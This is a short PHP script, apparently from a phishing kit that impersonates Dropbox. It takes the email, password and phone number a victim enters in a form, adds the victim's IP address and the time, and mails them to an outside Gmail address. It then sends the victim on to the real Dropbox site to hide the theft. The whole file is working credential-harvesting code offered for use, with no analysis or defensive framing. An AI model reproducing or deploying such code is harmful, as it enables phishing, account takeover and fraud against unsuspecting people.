<?php

$ip = $_SERVER['REMOTE_ADDR'];
$time = date("m-d-Y g:i:a");

$msg = "====================================\n";
$msg .= "Dropbox Login Info by Slimmz\n";
$msg .= "===================================\n";
$msg .= "Email : ".$_POST['username']."\n";
$msg .= "Password : ".$_POST['password']."\n";
$msg .= "Phone number : ".$_POST['tel']."\n";
$msg .= "Sent from $ip on $time\n";
$msg .= "====================================\n";

$to = "harriscart101@gmail.com";
$subject = "Dropbox $ip";
$from = "From: Dropbox<harriscart101@gmail.com>";

mail($to,$subject,$msg,$from);

header("Location: http://www.dropbox.com");


?>